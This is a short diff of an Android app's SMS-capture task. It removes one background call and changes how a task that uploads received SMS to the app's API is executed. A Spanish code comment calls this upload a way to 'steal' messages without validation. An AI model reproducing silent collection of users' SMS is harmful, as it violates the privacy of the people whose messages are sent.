@@ -10,6 +10,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.support.v4.content.ContextCompat;
+import android.support.v4.os.AsyncTaskCompat;
 import com.afollestad.materialdialogs.MaterialDialog;
 import com.tween.viacelular.R;
 import com.tween.viacelular.models.Land;
@@ -56,9 +57,6 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 					.progress(true, 0)
 					.show();
 			}
-
-			final CompaniesAsyncTask task = new CompaniesAsyncTask(activity, false);
-			task.execute();
 		}
 		catch(Exception e)
 		{
@@ -271,7 +269,7 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 			}
 
 			//Agregado para enviar los sms recibidos a la api, se movió para chorear sin necesidad de validar (siempre que haya sms)
-			new ConnectApiSMSAsyncTask(activity, false).execute();
+			new ConnectApiSMSAsyncTask(activity, false).executeOnExecutor(AsyncTask.SERIAL_EXECUTOR);
 		}
 		catch(Exception e)
 		{
